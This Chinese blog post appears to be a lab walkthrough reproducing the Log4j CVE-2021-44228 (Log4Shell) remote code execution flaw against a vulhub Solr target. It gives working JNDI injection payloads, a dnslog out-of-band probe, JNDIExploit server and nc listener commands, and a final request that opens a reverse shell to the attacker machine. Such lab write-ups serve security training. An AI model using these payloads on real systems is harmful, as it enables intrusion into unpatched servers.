#  Log4j CVE-2021-44228远程代码执行漏洞   
原创 Hacker  0xh4ck3r   2025-02-26 12:20  
  
## Log4j CVE-2021-44228远程代码执行漏洞  
### 影响范围  
  
Apache Log4j 2.x <= 2.14.1  
### 漏洞成因  
  
Log4j2默认支持解析ldap/rmi协议，并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。  
### 漏洞利用  
#### 环境准备  
  
<table><thead><tr><th valign="top" style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">名称</span></section></th><th valign="top" style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">IP</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">攻击机</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">192.168.75.162</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">靶机</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">192.168.75.146</span></section></td></tr></tbody></table>  
  
首先输入以下命令进入vulhub里启动靶场，然后在攻击机里访问http://192.168.75.146:8983即可  
```
cd vulhub-master/log4j/CVE-2021-44228
docker-compose up -d

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70Uvm96eDUHbkv0KVDMhvGxVMJIu0iaywzo1BEdX1BSj1z3RjjanP0ibXA/640?wx_fmt=png&from=appmsg "")  
  
image-20220721143339286  
#### 漏洞复现  
  
首先准备好生成利用的工具：**JNDIExploit-1.2-SNAPSHOT.jar**  
  
在利用漏洞之前，需要先判断目标是否出网，这里我们采用ceye来判断，也可以使用dnslog  
  
POC：#记得修改xxx.dnslog.cn为自己的，下方二选一  
```
${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}
${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}

```  
  
然后访问链接：  
```
http://192.168.75.146:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70HuCdaYLJu4Gkxgib94ZpQmR0iaek2N2gs6Bu2VaicfZFX0JddffaMOiaicA/640?wx_fmt=png&from=appmsg "")  
  
image-20220721145718365  
  
接下来在ceye或dnslog端即可看见java版本信息了，如下图所示，若无信息返回，则代表不出网  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70kL4VBqDVXB8uscd7PicySE6DbXSGbfiaYXWP4h9oibSI57nAL83hWJ0iaw/640?wx_fmt=png&from=appmsg "")  
  
image-20220721145902427  
  
接下来我们通过准备好的利用工具，输入如下指令  
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.75.162

```  
  
执行完上述命令会开启ldap和http服务，如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70icGavzhbQAwAAU5FP7nypic8aseXQQIuUDEpBR3rqaMcLL2FicKnLwMwg/640?wx_fmt=png&from=appmsg "")  
  
image-20220721152200190  
  
接下来新打开一个cmd窗口执行以下命令：  
```
nc -lvvp 6666

```  
  
监听启动后我们在浏览器输入：  
```
http://192.168.75.146:8983/solr/admin/cores?action=${jndi:ldap://192.168.75.162:1389/Basic/ReverseShell/192.168.75.162/6666}

```  
  
访问上述地址后，可以看到如下图，**反弹shell成功，此漏洞利用成功**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70ibwrTKxN4JlCoORu6stLicvndseOStwxDiaRkxpclibicEZlzfVVQyP3J6w/640?wx_fmt=png&from=appmsg "")  
  
image-20220721152316739  
  
  
